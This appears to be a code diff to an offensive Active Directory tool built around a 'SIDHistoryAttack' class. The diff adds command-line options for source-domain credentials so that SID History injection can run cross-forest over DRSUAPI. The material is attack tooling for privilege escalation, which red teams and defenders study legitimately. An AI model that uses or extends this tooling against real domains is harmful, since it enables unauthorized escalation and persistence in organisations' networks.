@@ -149,6 +149,12 @@ EXAMPLES:
     method.add_argument('--method', choices=['ldap', 'drsuapi'], default='ldap',
                        help='Injection method (default: ldap)')
 
+    # ── Source domain credentials (DRSUAPI cross-forest) ──
+    src_creds = parser.add_argument_group('Source domain credentials (for DRSUAPI cross-forest)')
+    src_creds.add_argument('--src-username', help='Username for source domain authentication')
+    src_creds.add_argument('--src-password', help='Password for source domain authentication')
+    src_creds.add_argument('--src-domain', help='Domain for source domain authentication (defaults to --source-domain)')
+
     # ── Bulk operations ──
     bulk = parser.add_argument_group('Bulk operations')
     bulk.add_argument('--targets-file', help='File with target sAMAccountNames (one per line)')
@@ -351,10 +357,17 @@ def handle_target(attacker: SIDHistoryAttack, formatter: OutputFormatter,
     if args.preset:
         success = attacker.add_sid_preset(target, args.preset, method=args.method)
     elif args.source_user:
+        # Source domain credentials for DRSUAPI cross-forest
+        src_creds_user = getattr(args, 'src_username', '') or ''
+        src_creds_password = getattr(args, 'src_password', '') or ''
+        src_creds_domain = getattr(args, 'src_domain', '') or args.source_domain or ''
         success = attacker.inject_sid_history(
             target, args.source_user,
             source_domain=args.source_domain,
-            method=args.method
+            method=args.method,
+            src_creds_user=src_creds_user,
+            src_creds_domain=src_creds_domain,
+            src_creds_password=src_creds_password,
         )
     elif args.sid:
         success = attacker.add_sid_to_history(target, args.sid, method=args.method)
